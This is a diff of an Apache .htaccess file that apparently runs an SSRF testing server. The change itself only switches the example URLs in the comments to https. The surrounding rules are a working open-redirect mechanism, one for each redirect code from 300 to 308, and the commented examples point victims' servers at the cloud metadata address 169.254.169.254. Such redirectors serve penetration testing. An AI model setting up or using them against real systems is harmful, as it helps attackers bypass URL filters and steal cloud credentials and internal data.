@@ -7,43 +7,43 @@ ErrorDocument 307 '{"a":[{"b":"2","c":"3"}]}'
 ErrorDocument 308 '{"a":[{"b":"2","c":"3"}]}'
 
 # 300 with response body
-# http://ssrf.localdomain.pw/json-with-body/300-http-169.254.169.254:80-.j.json
-# http://ssrf.localdomain.pw/json-with-body/300-http-169.254.169.254:80-test/.j.json
+# https://ssrf.localdomain.pw/json-with-body/300-http-169.254.169.254:80-.j.json
+# https://ssrf.localdomain.pw/json-with-body/300-http-169.254.169.254:80-test/.j.json
 RewriteEngine on
 RewriteCond %{REQUEST_URI} 300-([^/-]*)-([^/-]*)-(.*).j.json$
 RewriteRule 300-([^/-]*)-([^/-]*)-(.*).j.json$ $1://$2/$3 [L,R=300,NC]
 
 # 301 with response body
-# http://ssrf.localdomain.pw/json-with-body/301-http-169.254.169.254:80-.j.json
-# http://ssrf.localdomain.pw/json-with-body/301-http-169.254.169.254:80-test/.j.json
+# https://ssrf.localdomain.pw/json-with-body/301-http-169.254.169.254:80-.j.json
+# https://ssrf.localdomain.pw/json-with-body/301-http-169.254.169.254:80-test/.j.json
 RewriteEngine on
 RewriteCond %{REQUEST_URI} 301-([^/-]*)-([^/-]*)-(.*).j.json$
 RewriteRule 301-([^/-]*)-([^/-]*)-(.*).j.json$ $1://$2/$3 [L,R=301,NC]
 
 # 302 with response body
-# http://ssrf.localdomain.pw/json-with-body/302-http-169.254.169.254:80-.j.json
-# http://ssrf.localdomain.pw/json-with-body/302-http-169.254.169.254:80-test/.j.json
+# https://ssrf.localdomain.pw/json-with-body/302-http-169.254.169.254:80-.j.json
+# https://ssrf.localdomain.pw/json-with-body/302-http-169.254.169.254:80-test/.j.json
 RewriteEngine on
 RewriteCond %{REQUEST_URI} 302-([^/-]*)-([^/-]*)-(.*).j.json$
 RewriteRule 302-([^/-]*)-([^/-]*)-(.*).j.json$ $1://$2/$3 [L,R=302,NC]
 
 # 303 with response body
-# http://ssrf.localdomain.pw/json-with-body/303-http-169.254.169.254:80-.j.json
-# http://ssrf.localdomain.pw/json-with-body/303-http-169.254.169.254:80-test/.j.json
+# https://ssrf.localdomain.pw/json-with-body/303-http-169.254.169.254:80-.j.json
+# https://ssrf.localdomain.pw/json-with-body/303-http-169.254.169.254:80-test/.j.json
 RewriteEngine on
 RewriteCond %{REQUEST_URI} 303-([^/-]*)-([^/-]*)-(.*).j.json$
 RewriteRule 303-([^/-]*)-([^/-]*)-(.*).j.json$ $1://$2/$3 [L,R=303,NC]
 
 # 307 with response body
-# http://ssrf.localdomain.pw/json-with-body/307-http-169.254.169.254:80-.j.json
-# http://ssrf.localdomain.pw/json-with-body/307-http-169.254.169.254:80-test/.j.json
+# https://ssrf.localdomain.pw/json-with-body/307-http-169.254.169.254:80-.j.json
+# https://ssrf.localdomain.pw/json-with-body/307-http-169.254.169.254:80-test/.j.json
 RewriteEngine on
 RewriteCond %{REQUEST_URI} 307-([^/-]*)-([^/-]*)-(.*).j.json$
 RewriteRule 307-([^/-]*)-([^/-]*)-(.*).j.json$ $1://$2/$3 [L,R=307,NC]
 
 # 308 with response body
-# http://ssrf.localdomain.pw/json-with-body/308-http-169.254.169.254:80-.j.json
-# http://ssrf.localdomain.pw/json-with-body/308-http-169.254.169.254:80-test/.j.json
+# https://ssrf.localdomain.pw/json-with-body/308-http-169.254.169.254:80-.j.json
+# https://ssrf.localdomain.pw/json-with-body/308-http-169.254.169.254:80-test/.j.json
 RewriteEngine on
 RewriteCond %{REQUEST_URI} 308-([^/-]*)-([^/-]*)-(.*).j.json$
 RewriteRule 308-([^/-]*)-([^/-]*)-(.*).j.json$ $1://$2/$3 [L,R=308,NC]
